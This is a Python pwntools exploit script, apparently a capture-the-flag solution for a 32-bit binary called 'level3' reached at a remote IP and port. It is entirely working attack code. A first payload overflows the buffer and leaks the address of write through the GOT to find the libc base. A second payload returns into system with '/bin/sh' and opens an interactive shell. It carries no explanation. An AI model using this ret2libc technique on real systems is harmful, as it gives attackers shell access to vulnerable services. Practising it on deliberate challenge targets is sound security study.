from pwn import *

conn = remote('111.200.241.244',51740)
libc = ELF('./libc_32.so.6')
elf = ELF('./level3')

write_got_addr = elf.got['write']

write_plt_addr = elf.plt['write']
vulnerable_function_addr = 0x804844B
write_offset = libc.symbols['write']
system_offset = libc.symbols['system']
binsh_offset = libc.search("/bin/sh").next()

payload1 = b'A' * 0x8C + p32(write_plt_addr) + p32(vulnerable_function_addr) + p32(1) + p32(write_got_addr) + p32(4)
conn.recvuntil("Input:\n")
conn.sendline(payload1)

tmp = conn.recv(4)

write_addr = u32(tmp[0:4])
libc_base = write_addr - write_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

payload2 = b'A' * 0x8C + p32(system_addr) + p32(0) + p32(binsh_addr)
conn.recv()
conn.sendline(payload2)

conn.interactive()